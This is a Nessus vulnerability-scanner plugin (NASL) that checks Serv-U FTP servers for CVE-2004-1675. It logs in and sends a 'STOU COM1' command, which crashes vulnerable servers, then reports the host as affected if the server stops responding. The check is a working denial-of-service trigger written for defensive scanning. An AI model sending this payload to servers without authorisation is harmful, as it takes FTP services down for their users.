#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#
#  Ref: Patrick <patrickthomassen gmail com>
#
# This script is released under the GNU GPL v2


include("compat.inc");

if(description)
{
 script_id(14709);
 script_cve_id("CVE-2004-1675");
 script_bugtraq_id(11155);
 script_xref(name:"OSVDB", value:"9898");
 script_xref(name:"Secunia", value:"12507");

 script_version ("$Revision: 1.14 $");
   
 script_name(english:"FTP Serv-U 4.x-5.x STOU Command MS-DOS Argument Remote DoS");
  
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to crash the remote FTP server by sending it a STOU
command. An attacker could exploit this flaw to prevent users from
sharing data through FTP, and may even crash this host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-09/0097.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
		 	     
script_end_attributes();

 
 script_summary(english:"Crashes Serv-U");
 script_category(ACT_DENIAL);
 script_family(english:"FTP");
  
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
		  
 script_dependencie("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");



if(get_port_state(port))
{
 banner = get_ftp_banner(port:port);
 if ( ! banner || "Serv-U FTP Server" >!< banner ) exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = string("STOU COM1", "\r\n");
   send(socket:soc, data:s);
   close(soc);
   
   for (i = 1; i <= 3; i ++)
   {
     soc2 = open_sock_tcp(port);
     if (soc2) break;
     sleep(i);
   }
   to = get_read_timeout();
   if ( ! soc2 || ! recv_line(socket:soc2, length:4096, timeout: 3 * to ) )
     security_warning(port);
   else close(soc2);
   close(soc);
  }
 }
}
exit(0);
